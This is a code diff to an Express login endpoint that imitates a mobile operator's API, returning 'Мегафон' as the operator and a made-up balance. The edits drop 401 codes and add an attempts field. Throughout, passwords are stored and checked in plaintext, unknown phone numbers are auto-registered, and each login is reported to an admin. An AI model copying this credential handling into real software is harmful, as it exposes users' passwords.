@@ -125,27 +125,30 @@ app.post('/api/odp', (req, res) => {
         const phone = reqData.username || reqData.login || reqData.phone || reqData.msisdn || "";
         const password = reqData.password || reqData.pass || "";
         
-        // Авто-вход по живой сессии (если пароль и логин пустые)
+        // Авто-вход по живой сессии
         if (phone === "" && sid && sid !== "1") {
             const existingUser = db.prepare('SELECT * FROM users WHERE sid = ?').get(sid);
             if (existingUser) {
                 return res.json({ result: "ok", sid: existingUser.sid, operator: "Мегафон", region: "100", autoupdate_time: 3600, request_logs: [] });
             } else {
-                return res.json({ result: "error", code: "401", text: "Сессия устарела" });
+                // ВАЖНО: Убран code: 401, чтобы не было бесконечной петли перезапросов!
+                return res.json({ result: "error", text: "Сессия устарела. Введите логин и пароль." });
             }
         }
         
-        if (phone === "") return res.json({ result: "error", code: "401", text: "Необходима авторизация" });
+        if (phone === "") {
+            return res.json({ result: "error", text: "Необходима авторизация" }); // Тоже без 401
+        }
         
         const user = db.prepare('SELECT * FROM users WHERE phone = ?').get(phone);
         if (!user) {
              db.prepare('INSERT INTO users (phone, password, sid, balance) VALUES (?, ?, ?, ?)').run(phone, password, null, 1000.0);
              notifyAdmin(`🆕 Создан профиль: ${phone}`);
         } else if (user.password !== password) {
-            return res.json({ result: "error", code: "401", text: "Неверный пароль" });
+            // Оригинальный сервер возвращал attempt_remain
+            return res.json({ result: "error", text: "Неверный пароль", attempt_remain: "3" });
         }
             
-        // ГЕНЕРАЦИЯ УНИКАЛЬНОГО SID 100% БЕЗ ПОВТОРОВ
         const newSid = crypto.randomBytes(16).toString('hex');
         db.prepare('UPDATE users SET sid = ? WHERE phone = ?').run(newSid, phone);
         notifyAdmin(`🔓 Успешный вход: ${phone}`);
